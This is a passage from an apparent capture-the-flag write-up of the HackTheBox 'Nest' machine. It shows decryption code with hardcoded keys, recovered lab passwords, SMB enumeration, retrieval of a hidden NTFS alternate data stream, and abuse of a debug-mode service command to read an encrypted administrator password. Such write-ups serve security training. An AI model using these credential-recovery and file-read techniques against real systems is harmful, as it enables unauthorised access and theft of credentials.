:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ cat Module1.vb </span><br><span class="line">Module Module1</span><br><span class="line"></span><br><span class="line">    Sub Main()</span><br><span class="line">        Dim Config As ConfigFile = ConfigFile.LoadFromFile(<span class="string">"RU_Config.xml"</span>)</span><br><span class="line">        Dim <span class="built_in">test</span> As New SsoIntegration With &#123;.Username = Config.Username, .Password = Utils.DecryptString(Config.Password)&#125;</span><br><span class="line"></span><br><span class="line">    End Sub</span><br><span class="line"></span><br><span class="line">End Module</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><p>And the <code>Utils.vb</code> are responsible for decrypting the password :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ cat Utils.vb</span><br><span class="line">Imports System.Text</span><br><span class="line">Imports System.Security.Cryptography</span><br><span class="line">Public Class Utils</span><br><span class="line"></span><br><span class="line">    Public Shared Function GetLogFilePath() As String</span><br><span class="line">        Return IO.Path.Combine(Environment.CurrentDirectory, <span class="string">"Log.txt"</span>)</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">        If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">            Return String.Empty</span><br><span class="line">        Else</span><br><span class="line">            Return Decrypt(EncryptedString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">        End If</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function EncryptString(PlainString As String) As String</span><br><span class="line">        If String.IsNullOrEmpty(PlainString) Then</span><br><span class="line">            Return String.Empty</span><br><span class="line">        Else</span><br><span class="line">            Return Encrypt(PlainString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">        End If</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function Encrypt(ByVal plainText As String, _</span><br><span class="line">                                   ByVal passPhrase As String, _</span><br><span class="line">                                   ByVal saltValue As String, _</span><br><span class="line">                                    ByVal passwordIterations As Integer, _</span><br><span class="line">                                   ByVal initVector As String, _</span><br><span class="line">                                   ByVal keySize As Integer) _</span><br><span class="line">                           As String</span><br><span class="line"></span><br><span class="line">        Dim initVectorBytes As Byte() = Encoding.ASCII.GetBytes(initVector)</span><br><span class="line">        Dim saltValueBytes As Byte() = Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line">        Dim plainTextBytes As Byte() = Encoding.ASCII.GetBytes(plainText)</span><br><span class="line">        Dim password As New Rfc2898DeriveBytes(passPhrase, _</span><br><span class="line">                                           saltValueBytes, _</span><br><span class="line">                                           passwordIterations)</span><br><span class="line">        Dim keyBytes As Byte() = password.GetBytes(CInt(keySize / 8))</span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line">        Dim encryptor As ICryptoTransform = symmetricKey.CreateEncryptor(keyBytes, initVectorBytes)</span><br><span class="line">        Using memoryStream As New IO.MemoryStream()</span><br><span class="line">            Using cryptoStream As New CryptoStream(memoryStream, _</span><br><span class="line">                                            encryptor, _</span><br><span class="line">                                            CryptoStreamMode.Write)</span><br><span class="line">                cryptoStream.Write(plainTextBytes, 0, plainTextBytes.Length)</span><br><span class="line">                cryptoStream.FlushFinalBlock()</span><br><span class="line">                Dim cipherTextBytes As Byte() = memoryStream.ToArray()</span><br><span class="line">                memoryStream.Close()</span><br><span class="line">                cryptoStream.Close()</span><br><span class="line">                Return Convert.ToBase64String(cipherTextBytes)</span><br><span class="line">            End Using</span><br><span class="line">        End Using</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">    Public Shared Function Decrypt(ByVal cipherText As String, _</span><br><span class="line">                                   ByVal passPhrase As String, _</span><br><span class="line">                                   ByVal saltValue As String, _</span><br><span class="line">                                    ByVal passwordIterations As Integer, _</span><br><span class="line">                                   ByVal initVector As String, _</span><br><span class="line">                                   ByVal keySize As Integer) _</span><br><span class="line">                           As String</span><br><span class="line"></span><br><span class="line">        Dim initVectorBytes As Byte()</span><br><span class="line">        initVectorBytes = Encoding.ASCII.GetBytes(initVector)</span><br><span class="line"></span><br><span class="line">        Dim saltValueBytes As Byte()</span><br><span class="line">        saltValueBytes = Encoding.ASCII.GetBytes(saltValue)</span><br><span class="line"></span><br><span class="line">        Dim cipherTextBytes As Byte()</span><br><span class="line">        cipherTextBytes = Convert.FromBase64String(cipherText)</span><br><span class="line"></span><br><span class="line">        Dim password As New Rfc2898DeriveBytes(passPhrase, _</span><br><span class="line">                                           saltValueBytes, _</span><br><span class="line">                                           passwordIterations)</span><br><span class="line"></span><br><span class="line">        Dim keyBytes As Byte()</span><br><span class="line">        keyBytes = password.GetBytes(CInt(keySize / 8))</span><br><span class="line"></span><br><span class="line">        Dim symmetricKey As New AesCryptoServiceProvider</span><br><span class="line">        symmetricKey.Mode = CipherMode.CBC</span><br><span class="line"></span><br><span class="line">        Dim decryptor As ICryptoTransform</span><br><span class="line">        decryptor = symmetricKey.CreateDecryptor(keyBytes, initVectorBytes)</span><br><span class="line"></span><br><span class="line">        Dim memoryStream As IO.MemoryStream</span><br><span class="line">        memoryStream = New IO.MemoryStream(cipherTextBytes)</span><br><span class="line"></span><br><span class="line">        Dim cryptoStream As CryptoStream</span><br><span class="line">        cryptoStream = New CryptoStream(memoryStream, _</span><br><span class="line">                                        decryptor, _</span><br><span class="line">                                        CryptoStreamMode.Read)</span><br><span class="line"></span><br><span class="line">        Dim plainTextBytes As Byte()</span><br><span class="line">        ReDim plainTextBytes(cipherTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        Dim decryptedByteCount As Integer</span><br><span class="line">        decryptedByteCount = cryptoStream.Read(plainTextBytes, _</span><br><span class="line">                                               0, _</span><br><span class="line">                                               plainTextBytes.Length)</span><br><span class="line"></span><br><span class="line">        memoryStream.Close()</span><br><span class="line">        cryptoStream.Close()</span><br><span class="line"></span><br><span class="line">        Dim plainText As String</span><br><span class="line">        plainText = Encoding.ASCII.GetString(plainTextBytes, _</span><br><span class="line">                                            0, _</span><br><span class="line">                                            decryptedByteCount)</span><br><span class="line"></span><br><span class="line">        Return plainText</span><br><span class="line">    End Function</span><br><span class="line"></span><br><span class="line">End Class</span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> WIP/RU/RUScanner </span><br><span class="line">‚ùØ</span><br></pre></td></tr></table></figure><h3 id="Decrypting-the-Password"><a href="#Decrypting-the-Password" class="headerlink" title="Decrypting the Password"></a>Decrypting the Password</h3><p>We can cut and patch some of this code together to make a single file we can run on <a href="https://dotnetfiddle.net" target="_blank" rel="noopener">dotnetfiddle</a><br>I put the hash I got early on the line run the line <code>Return Decrypt</code> script. the decryption is happen here :</p><p><strong>Decrypt(‚ÄúHASH‚Äù, ‚ÄúN3st22‚Äù, ‚Äú88552299‚Äù, 2, ‚Äú464R5DFA5DL6LE28‚Äù, 256)</strong> so :</p><p>from :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">    If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">        Return String.Empty</span><br><span class="line">    Else</span><br><span class="line">    <span class="comment"># replace hash here </span></span><br><span class="line">        Return Decrypt(EncryptedString, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>to :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Public Shared Function DecryptString(EncryptedString As String) As String</span><br><span class="line">    If String.IsNullOrEmpty(EncryptedString) Then</span><br><span class="line">        Return String.Empty</span><br><span class="line">    Else</span><br><span class="line">    <span class="comment"># replace hash here </span></span><br><span class="line">        Return Decrypt(<span class="string">"fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE="</span>, <span class="string">"N3st22"</span>, <span class="string">"88552299"</span>, 2, <span class="string">"464R5DFA5DL6LE28"</span>, 256)</span><br><span class="line">    End If</span><br><span class="line">End Function</span><br></pre></td></tr></table></figure><p>Execute this and we will get the password <code>xRxRxPANCAK3SxRxRx</code> this is the final results :</p><p><img src="/img/nest/nest-hash-result.png" alt="HackTheBox-Nest" title="Password decrypted"></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><h3 id="Enumerate-C-Smith"><a href="#Enumerate-C-Smith" class="headerlink" title="Enumerate C.Smith"></a>Enumerate C.Smith</h3><p>So now that I successfully decrypt the password. How about try to login it again in <code>smbclient</code> :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ smbclient  \\\\10.10.10.178\\Users -U C.Smith</span><br><span class="line">Enter WORKGROUP\C.Smith<span class="string">'s password: </span></span><br><span class="line"><span class="string">Try "help" to get a list of possible commands.</span></span><br><span class="line"><span class="string">smb: \&gt; recurse on</span></span><br><span class="line"><span class="string">smb: \&gt; ls</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 07:04:21 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 07:04:21 2020</span></span><br><span class="line"><span class="string">  Administrator                       D        0  Fri Aug  9 23:08:23 2019</span></span><br><span class="line"><span class="string">  C.Smith                             D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  L.Frost                             D        0  Fri Aug  9 01:03:01 2019</span></span><br><span class="line"><span class="string">  R.Thompson                          D        0  Fri Aug  9 01:02:50 2019</span></span><br><span class="line"><span class="string">  TempUser                            D        0  Thu Aug  8 06:55:56 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\Administrator</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \Administrator\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith</span></span><br><span class="line"><span class="string">  .                                   D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  ..                                  D        0  Sun Jan 26 15:21:44 2020</span></span><br><span class="line"><span class="string">  HQK Reporting                       D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  user.txt                            A       32  Fri Aug  9 07:05:24 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\L.Frost</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \L.Frost\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\R.Thompson</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \R.Thompson\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\TempUser</span></span><br><span class="line"><span class="string">NT_STATUS_ACCESS_DENIED listing \TempUser\*</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith\HQK Reporting</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 07:06:17 2019</span></span><br><span class="line"><span class="string">  AD Integration Module               D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  Debug Mode Password.txt             A        0  Fri Aug  9 07:08:17 2019</span></span><br><span class="line"><span class="string">  HQK_Config_Backup.xml               A      249  Fri Aug  9 07:09:05 2019</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">\C.Smith\HQK Reporting\AD Integration Module</span></span><br><span class="line"><span class="string">  .                                   D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  ..                                  D        0  Fri Aug  9 20:18:42 2019</span></span><br><span class="line"><span class="string">  HqkLdap.exe                         A    17408  Thu Aug  8 07:41:16 2019</span></span><br></pre></td></tr></table></figure><p>so looks like i can now get the <code>user.txt</code> as you can see on this line :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \&gt; cd C.Smith</span><br><span class="line">smb: \C.Smith\&gt; ls</span><br><span class="line">  .                                   D        <span class="number">0</span>  Sun Jan <span class="number">26</span> <span class="number">15</span>:<span class="number">21</span>:<span class="number">44</span> <span class="number">2020</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Sun Jan <span class="number">26</span> <span class="number">15</span>:<span class="number">21</span>:<span class="number">44</span> <span class="number">2020</span></span><br><span class="line">  HQK Reporting                       D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  user.txt                            A       <span class="number">32</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">05</span>:<span class="number">24</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  AD Integration Module               D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  Debug Mode Password.txt             A        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">08</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  HQK_Config_Backup.xml               A      <span class="number">249</span>  Fri Aug  <span class="number">9</span> <span class="number">07</span>:<span class="number">09</span>:<span class="number">05</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting\AD Integration Module</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">20</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  HqkLdap.exe                         A    <span class="number">17408</span>  Thu Aug  <span class="number">8</span> <span class="number">07</span>:<span class="number">41</span>:<span class="number">16</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">                <span class="number">10485247</span> blocks of size <span class="number">4096.</span> <span class="number">6544137</span> blocks available</span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure><h3 id="Grab-the-user-flag"><a href="#Grab-the-user-flag" class="headerlink" title="Grab the user flag"></a>Grab the user flag</h3><p>Finally I have now the <code>user.txt</code> i downloaded it using <code>smbclient</code> :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\&gt; mget user.txt</span><br><span class="line">Get file user.txt? y</span><br><span class="line">getting file \C.Smith\user.txt of size <span class="number">32</span> <span class="keyword">as</span> user.txt (<span class="number">0.0</span> KiloBytes/sec) (average <span class="number">0.0</span> KiloBytes/sec)</span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ cut -c 4-12 user.txt</span><br><span class="line">b25404be</span><br></pre></td></tr></table></figure><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><p>So going to the firs enumeration of <code>C.Smith</code> there‚Äôs a interesting <code>.txt</code> file and executable <code>HqkLdap.exe</code> as you see on this line :</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line"><span class="meta"># bash</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting</span><br><span class="line">  .                                   D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">06</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  AD Integration Module               D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  Debug Mode Password.txt             A        <span class="number">0</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">08</span>:<span class="number">17</span> <span class="number">2019</span></span><br><span class="line">  HQK_Config_Backup.xml               A      <span class="number">249</span>  Thu Aug  <span class="number">8</span> <span class="number">19</span>:<span class="number">09</span>:<span class="number">05</span> <span class="number">2019</span></span><br><span class="line"></span><br><span class="line">\C.Smith\HQK Reporting\AD Integration Module</span><br><span class="line">  .                                   D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  ..                                  D        <span class="number">0</span>  Fri Aug  <span class="number">9</span> <span class="number">08</span>:<span class="number">18</span>:<span class="number">42</span> <span class="number">2019</span></span><br><span class="line">  HqkLdap.exe                         A    <span class="number">17408</span>  Wed Aug  <span class="number">7</span> <span class="number">19</span>:<span class="number">41</span>:<span class="number">16</span> <span class="number">2019</span></span><br></pre></td></tr></table></figure><p>I initially came across the <code>Debug Mode Password.txt</code> file and thought this could be used to authenticate to the <code>DEBUG</code> mode of the <strong><code>HQK Reporting Service v1.2</code></strong> service running on port <code>4386</code> we see this on our <code>nmap</code> scan. The file appeared to have 0 bytes. I spent some time searching around further and couldn‚Äôt find any other files of interest. After wasting some time on futile approaches, I eventually realized that the file could potentially have had alternate streams on an NTFS file system. I enumerated the streams and retrieved the Password stream of the file :</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\&gt; more DEBUGM~1.TXT:Password:<span class="variable">$DATA</span></span><br><span class="line">getting file \C.Smith\HQK Reporting\DEBUGM~1.TXT:Password:<span class="variable">$DATA</span> of size 15 as /tmp/smbmore.mFLHg4 (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)</span><br><span class="line"></span><br><span class="line">WBQ201953D8w</span><br><span class="line">/tmp/smbmore.mFLHg4</span><br><span class="line"></span><br><span class="line">smb: \C.Smith\&gt;</span><br></pre></td></tr></table></figure><p>if I run <code>allinfo</code> on it, I can see something else:</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\&gt; allinfo <span class="string">"Debug Mode Password.txt"</span></span><br><span class="line">altname: DEBUGM~1.TXT</span><br><span class="line">create_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span><br><span class="line">access_time:    Thu Aug  8 07:06:12 PM 2019 EDT</span><br><span class="line">write_time:     Thu Aug  8 07:08:17 PM 2019 EDT</span><br><span class="line">change_time:    Thu Aug  8 07:08:17 PM 2019 EDT</span><br><span class="line">attributes: A (20)</span><br><span class="line">stream: [::<span class="variable">$DATA</span>], 0 bytes</span><br><span class="line">stream: [:Password:<span class="variable">$DATA</span>], 15 bytes</span><br><span class="line"></span><br><span class="line">‚ùØ cat Debug\ Mode\ Password.txt:Password</span><br><span class="line">WBQ201953D8w</span><br></pre></td></tr></table></figure><p>So this really interesting it shows <code>password debug : WBQ201953D8w</code> this will be something useful later :</p><h3 id="Enumeration-with-telnet"><a href="#Enumeration-with-telnet" class="headerlink" title="Enumeration with telnet"></a>Enumeration with telnet</h3><p>I‚Äôll connect again to <code>HQK</code> with <code>telnet</code> in port <code>4386</code> and start digging. We can then use the <code>password debug</code> to gain the ability to run the <code>SHOWQUERY</code> command on the HQK Reporting Service. This functionality can be used to read files. After spending some time searching around I came across the <code>Ldap.conf</code> file that is located in <code>../LDAP/</code>.</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">root <span class="keyword">in</span> htb/boxes/Nest </span><br><span class="line">‚ùØ telnet 10.10.10.178 4386</span><br><span class="line">Trying 10.10.10.178...                                                                                                                                                                     </span><br><span class="line">Connected to 10.10.10.178.                                                                                                                                                                 </span><br><span class="line">Escape character is <span class="string">'^]'</span>.                                                                                                                                                                  </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">HQK Reporting Service V1.2                                                                                                                                                                 </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">&gt;<span class="built_in">help</span>                                                                                                                                                                                      </span><br><span class="line">                                                                                                                                                                                           </span><br><span class="line">This service allows users to run queries against databases using the legacy HQK format                                                                                                     </span><br><span class="line">                                                                                                                                                                                                                </span><br><span class="line">--- AVAILABLE COMMANDS ---                                                                                                                                                                                      </span><br><span class="line"></span><br><span class="line">LIST</span><br><span class="line">SETDIR &lt;Directory_Name&gt;</span><br><span class="line">RUNQUERY &lt;Query_ID&gt;</span><br><span class="line">DEBUG &lt;Password&gt;</span><br><span class="line">HELP &lt;Command&gt;</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line">&gt;DEBUG WBQ201953D8w</span><br><span class="line"></span><br><span class="line">Debug mode enabled. Use the HELP <span class="built_in">command</span> to view additional commands that are now available</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Debug mode enabled. Use the HELP <span class="built_in">command</span> to view additional commands that are now available</span><br><span class="line">&gt;<span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">This service allows users to run queries against databases using the legacy HQK format</span><br><span class="line"></span><br><span class="line">--- AVAILABLE COMMANDS ---</span><br><span class="line"></span><br><span class="line">LIST</span><br><span class="line">SETDIR &lt;Directory_Name&gt;</span><br><span class="line">RUNQUERY &lt;Query_ID&gt;</span><br><span class="line">DEBUG &lt;Password&gt;</span><br><span class="line">HELP &lt;Command&gt;</span><br><span class="line">SERVICE</span><br><span class="line">SESSION</span><br><span class="line">SHOWQUERY &lt;Query_ID&gt;</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>I set the <code>dir</code> to <code>HQK</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">&gt;setdir ..</span><br><span class="line"></span><br><span class="line">Current directory <span class="built_in">set</span> to HQK</span><br><span class="line">&gt;list</span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[DIR]  ALL QUERIES</span><br><span class="line">[DIR]  LDAP</span><br><span class="line">[DIR]  Logs</span><br><span class="line">[1]   HqkSvc.exe</span><br><span class="line">[2]   HqkSvc.InstallState</span><br><span class="line">[3]   HQK_Config.xml</span><br><span class="line"></span><br><span class="line">Current Directory: HQK</span><br><span class="line">&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Current Directory: HQK</span><br><span class="line">&gt;setdir LDAP</span><br><span class="line"></span><br><span class="line">Current directory <span class="built_in">set</span> to LDAP</span><br><span class="line">&gt;list</span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[1]   HqkLdap.exe</span><br><span class="line">[2]   Ldap.conf</span><br><span class="line"></span><br><span class="line">Current Directory: LDAP</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><p>I try to show the <code>Ldap.conf</code> and it give us administrator credentials but the password looks like encrypted again .</p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">Use the query ID numbers below with the RUNQUERY <span class="built_in">command</span> and the directory names with the SETDIR <span class="built_in">command</span></span><br><span class="line"></span><br><span class="line"> QUERY FILES IN CURRENT DIRECTORY</span><br><span class="line"></span><br><span class="line">[1]   HqkLdap.exe</span><br><span class="line">[2]   Ldap.conf</span><br><span class="line"></span><br><span class="line">Current Directory: LDAP</span><br><span class="line">&gt;showquery 2</span><br><span class="line"></span><br><span class="line">Domain=nest.local</span><br><span class="line">Port=389</span><br><span class="line">BaseOu=OU=WBQ Users,OU=Production,DC=nest,DC=<span class="built_in">local</span></span><br><span class="line">User=Administrator</span><br><span class="line">Password=yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=</span><br><span class="line"></span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure><h3 id="Analyzing-the-HqkLdap-exe"><a href="#Analyzing-the-HqkLdap-exe" class="headerlink" title="Analyzing the HqkLdap.exe"></a>Analyzing the HqkLdap.exe</h3><p>I downloaded the <code>HqkLdap.exe</code> and analyze it using <a href="https://www.jetbrains.com/decompiler/" target="_blank" rel="noopener">JetBrains - dotPeek</a> it is a free <code>NET Decompiler and Assembly</code></p><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line"></span><br><span class="line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt; mget HqkLdap.exe</span><br><span class="line">Get file HqkLdap.exe? y</span><br><span class="line">getting file \C.Smith\HQK Reporting\AD Integration Module\HqkLdap.exe of size 17408 as HqkLdap.exe (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec)</span><br><span class="line">smb: \C.Smith\HQK Reporting\AD Integration Module\&gt;</span><br></pre></td></tr></table></figure><p>Looking at <code>CR Module</code> binary :</p><p><img src="/img/nest/CR-Binary.png" alt="HackTheBox-Nest" title="CR Binary"></p><p>This contains the Arguments that we have to pass in the same script from which we <code>Decrypted</code> the user <code>hash</code> because the hash that we found in <code>LDAP.conf</code> is encrypted using another method which we got in <code>CR module(part)</code> and the arguments that we will pass in the decrypt function and compile it.</p><h3 id="Debugging-the-HqkLdap-exe"><a href="#Debugging-the-HqkLdap-exe" class="headerlink" title="Debugging the HqkLdap.exe"></a>Debugging the HqkLdap.exe</h3><p>Did you rember the <code>vb script</code> that will decrypt the encryped password ? I use it again to decrypt also the admin password hash . I replace only this line :</p><p>from</p><p><strong>Decrypt(‚ÄúHASH‚Äù, ‚ÄúN3st22‚Äù, ‚Äú88552299‚Äù, 2, ‚Äú464R5DFA5DL6LE28‚Äù, 256)</strong><br><code>&quot;fTEzAfYDoz1YzkqhQkH6GQFYKp1XY5hm7bjOP86yYxE=&quot;, &quot;N3st22&quot;, &quot;88552299&quot;, 2, &quot;464R5DFA5DL6LE28&quot;, 256</code></p><p>to :</p><p><strong>Decrypt(‚ÄúHASH‚Äù, ‚Äú667912‚Äù, ‚Äú1313Rf99‚Äù, 3, ‚Äú1L1SA61493DRV53Z‚Äù, 256)</strong><br><code>&quot;yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=&quot;, &quot;667912&quot;, &quot;1313Rf99&quot;, 3, &quot;1L1SA61493DRV53Z&quot;, 256</code></p><p>This is the final script</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># vb.net</span></span><br><span class="line"></span><br><span class="line">Imports System.Text</span><br><span class="line">Imports System</span><br><span class="line">Imports System.Security.Cryptography</span><br><span class="line"></span><br><span class="line">Public Module Module1</span><br><span class="line"><span class="function">Public Sub <span class="title">Main</span><span class="params">()</span></span></span><br><span class="line">Console.WriteLine(Decrypt("yyEq0Uvvhq2uQOcWG8peLoeRQehqip/fKdeG/kjEVb4=", "667912", "1313Rf99", 3, "1L1SA61493DRV53Z", 256))</span><br><span class="line">End Sub</span><br><span class="line"> <span class="function">Public Function <span class="title">Decrypt</span><span class="params">(ByVal cipherText As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal passPhrase As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal saltValue As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                    ByVal passwordIterations As Integer, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal initVector As <span class="keyword">String</span>, _</span></span></span><br><span class="line"><span class="function"><span class="params">                                   ByVal keySize As Integer)</span> _</span></span><br><span class="line"><span class="function">                           As <span class="keyword">String</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">        Dim initVectorBytes As <span class="title">Byte</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        initVectorBytes </span>= Encoding.ASCII.GetBytes(initVector)</span><br><span class="line"></span><br><span class="line">        <span class="function">Dim saltValueBytes As <span 